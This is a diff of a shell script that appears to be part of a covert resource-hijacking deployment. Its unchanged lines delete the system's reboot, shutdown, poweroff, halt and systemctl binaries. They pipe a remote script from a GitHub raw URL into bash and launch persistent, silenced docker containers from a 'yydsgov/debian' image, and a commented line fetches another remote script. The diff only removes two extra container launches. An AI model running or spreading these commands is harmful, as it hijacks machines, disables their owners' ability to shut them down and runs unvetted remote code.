@@ -4,8 +4,7 @@ sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl
 
 bash -c "wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/d.sh |bash -s 9 trguiftu/ikhudfrt && docker run -dt --restart=always yydsgov/debian:latest" >/dev/null 2>&1 &
 bash -c "docker run -dt --restart=always --name ai2 yydsgov/debian:latest" >/dev/null 2>&1 &
-bash -c "docker run -dt --restart=always --name ai3 yydsgov/debian:latest" >/dev/null 2>&1 &
-bash -c "docker run -dt --restart=always --name ai4 yydsgov/debian:latest" >/dev/null 2>&1 &
+
 
 ##bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/awsai.sh) >/dev/null 2>&1 &
 
